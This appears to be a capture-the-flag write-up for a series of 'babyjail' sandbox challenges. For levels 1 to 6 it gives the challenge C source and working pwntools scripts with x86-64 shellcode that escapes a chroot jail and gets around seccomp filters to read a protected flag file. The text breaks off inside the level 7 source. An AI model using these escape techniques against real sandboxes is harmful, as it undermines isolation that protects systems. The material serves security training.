# Babyjail_level1

## Overall


***babyjail_level1.c***

```cpp
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");
    puts("The only thing you can do in this challenge is read out one single file, as specified by the first argument to the");
    puts("program (argv[1]).\n");

    assert(argc > 1);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    printf("Sending the file at `%s` to stdout.\n", argv[1]);
    sendfile(1, open(argv[1], 0), 0, 128);
```


## Approach 

```
./babyjail_level1 ../flag
```

# Babyjail_level2
## Overall


babyjail_level2.c

```cpp
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");

    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    assert(argc > 1);

    puts("Checking to make sure you're not trying to open the flag.\n");
    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    puts("Executing shellcode!\n");

    ((void(*)())shellcode)();
```


## Approach 

```
read(0, rsp, 100) // write "../../../flag" to rsp
fd = open(rsp, 0)
read(fd, rsp, 100)
write(1, rsp, 100)
```

## Script
solve.py

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('/challenge/babyjail_level2', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc

gs = """
b *main
"""

def info(mess):
    return log.info(mess)

def success(mess):
    return log.success(mess)

def error(mess):
    log.error(mess)


shellcode = asm("""
xor rax, rax
xor rdi, rdi
mov rsi, rsp
mov rdx, 0x64
syscall

xor rax, rax
mov al, 0x02
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall

xor rax, rax
mov rdi, 0x3
mov rsi, rsp
mov dl, 0x64
syscall

mov al, 0x1
mov dil, 0x1
syscall


""", arch = 'amd64', os ='linux')

def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process(['/challenge/babyjail_level2', 'a'])

io = start()
io.sendlineafter(b'Reading 0x1000 bytes of shellcode from stdin.\n', shellcode)
io.send(b'../../../flag\x00')
io.interactive()
```


# Babyjail_level3

## Overall


***babyjail_level3.c***

```cpp
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");

    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    assert(argc > 1);

    puts("Checking to make sure you're not trying to open the flag.\n");
    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    puts("Moving the current working directory into the jail.\n");
    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    puts("Executing shellcode!\n");

    ((void(*)())shellcode)();
```


## Approach 

```c
mkdir a
chroot(a)
open('/flag', 0)
sendfile(1, 3, 0, 100)
```

## Script
solve.py

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('/challenge/babyjail_level3', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc

gs = """
b *main
"""

def info(mess):
    return log.info(mess)

def success(mess):
    return log.success(mess)

def error(mess):
    log.error(mess)


shellcode = asm("""
xor rax, rax
mov al, 0x53
lea rdi, [rip +dir]
mov rsi, 0777
syscall

xor rax, rax
mov al, 0xa1
lea rdi, [rip +dir]
syscall

xor rax, rax
mov al, 0x2
lea rdi, [rip + flag]
xor rsi, rsi
xor rdx, rdx
syscall

mov rsi, rax
xor rax, rax
mov al, 0x28
xor rdi, rdi
mov dil, 0x1
xor rdx, rdx
mov r10, 0x64
syscall

dir:
        .string "temp"
flag:
        .string "../../flag"

""", arch = 'amd64', os ='linux')

def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process(['/challenge/babyjail_level3', 'a'])

io = start()
io.sendlineafter(b'Reading 0x1000 bytes of shellcode from stdin.\n', shellcode)
io.interactive()
```


# Babyjail_level4

## Overall

***babyjail_level4.c***


```cpp
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");

    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    puts("For extra security, this challenge will only allow certain system calls!\n");

    assert(argc > 1);

    puts("Checking to make sure you're not trying to open the flag.\n");
    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    puts("Moving the current working directory into the jail.\n");
    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    scmp_filter_ctx ctx;

    puts("Restricting system calls (default: kill).\n");
    ctx = seccomp_init(SCMP_ACT_KILL);
    printf("Allowing syscall: %s (number %i).\n", "openat", SCMP_SYS(openat));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "write", SCMP_SYS(write));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "sendfile", SCMP_SYS(sendfile));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);

    puts("Executing shellcode!\n");

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```


## Approach

```
fd = openat(open("/", 0), "flag", 0)
sendfile(1, fd, 0, 100)
```

## Script

solve.py

```python
#!/usr/bi/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('/challenge/babyjail_level4', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc

gs = """
b *main
"""

def info(mess):
    return log.info(mess)

def success(mess):
    return log.success(mess)

def error(mess):
    log.error(mess)


shellcode = asm("""
        xor rax, rax
        mov eax, 0x101
        xor rdi, rdi
        mov dil, 0x3
        lea rsi, [rip+flag]
        mov rdx, 0
        syscall
        
        mov rsi, rax
        xor rax, rax
        mov al, 0x28
        xor rdi, rdi
        mov dil, 1
        xor rdx, rdx
        mov r10, 100
        syscall
flag:
    .asciz "flag"
""", arch = 'amd64', os ='linux')

def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process(['/challenge/babyjail_level4', '/'])

io = start()
io.sendlineafter(b'Reading 0x1000 bytes of shellcode from stdin.\n', shellcode)
io.interactive()
```


# Babyjail_level5

## Overall


***babyjail_level5.c***

```cpp
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");

    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    puts("For extra security, this challenge will only allow certain system calls!\n");

    assert(argc > 1);

    puts("Checking to make sure you're not trying to open the flag.\n");
    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    puts("Moving the current working directory into the jail.\n");
    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    scmp_filter_ctx ctx;

    puts("Restricting system calls (default: kill).\n");
    ctx = seccomp_init(SCMP_ACT_KILL);
    printf("Allowing syscall: %s (number %i).\n", "linkat", SCMP_SYS(linkat));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(linkat), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "open", SCMP_SYS(open));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "write", SCMP_SYS(write));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "sendfile", SCMP_SYS(sendfile));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);

    puts("Executing shellcode!\n");

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
```


## Approach 

```
linkat(3, "flag", 4, "flag.txt", 0)
sendfile(1, open("flag.txt", 0), 0, 100)
```

## Script 

solve.py

```python
#!/usr/bi/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('/challenge/babyjail_level5', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc

gs = """
b *main
"""

def info(mess):
    return log.info(mess)

def success(mess):
    return log.success(mess)

def error(mess):
    log.error(mess)


shellcode = asm("""
xor rax, rax
mov eax, 0x109
xor rdi, rdi
mov dil, 0x3
lea rsi, [rip + olddir]
xor rdx, rdx
mov dl, 0x4
lea r10, [rip + newdir]
xor r8, r8
syscall

xor rax, rax
mov al, 0x2
lea rdi, [rip + newdir]
xor rsi, rsi
xor rdx, rdx
syscall

mov rsi, rax
xor rax, rax
mov al, 0x28
xor rdi, rdi
mov dil, 0x1
xor rdx, rdx
mov r10, 0x64
syscall

olddir:
    .asciz "flag"

newdir:
    .asciz "/flag.txt"


""", arch = 'amd64', os ='linux')

def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process(['/challenge/babyjail_level5', '/'])

io = start()
io.sendlineafter(b'Reading 0x1000 bytes of shellcode from stdin.\n', shellcode)
io.interactive()
```


# Babyjail_level6

## Overall

***babyjail_level6.c***

```cpp
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");

    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    puts("For extra security, this challenge will only allow certain system calls!\n");

    assert(argc > 1);

    puts("Checking to make sure you're not trying to open the flag.\n");
    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    puts("Moving the current working directory into the jail.\n");
    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    scmp_filter_ctx ctx;

    puts("Restricting system calls (default: kill).\n");
    ctx = seccomp_init(SCMP_ACT_KILL);
    printf("Allowing syscall: %s (number %i).\n", "fchdir", SCMP_SYS(fchdir));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fchdir), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "open", SCMP_SYS(open));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "write", SCMP_SYS(write));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "sendfile", SCMP_SYS(sendfile));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);

    puts("Executing shellcode!\n");

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
```

## Approach

```cpp
int fd = open("/", 0);
fchdir(fd);
int fd_flag = open("flag", 0);
sendfile(1, fd_flag, 0, 100);
```

## Script

solve.py

```python
#!/usr/bi/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('/challenge/babyjail_level6', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc

gs = """
b *main
"""

def info(mess):
    return log.info(mess)

def success(mess):
    return log.success(mess)

def error(mess):
    log.error(mess)


shellcode = asm("""
xor rax, rax
mov al, 0x51
xor rdi, rdi
mov dil, 0x3
syscall

xor rax, rax
mov al, 0x2
lea rdi, [rip + flag]
xor rsi, rsi
xor rdx, rdx
syscall

mov rsi, rax
xor rax, rax
mov al, 0x28
xor rdi, rdi
mov dil, 0x1
xor rdx, rdx
mov r10, 0x64
syscall

flag:
    .asciz "flag"




""", arch = 'amd64', os ='linux')

def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process(['/challenge/babyjail_level6', '/'])

io = start()
io.sendlineafter(b'Reading 0x1000 bytes of shellcode from stdin.\n', shellcode)
io.interactive()
```


# Babyjail_level7

## Overall

***babyjail_level7.c***

```cpp
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
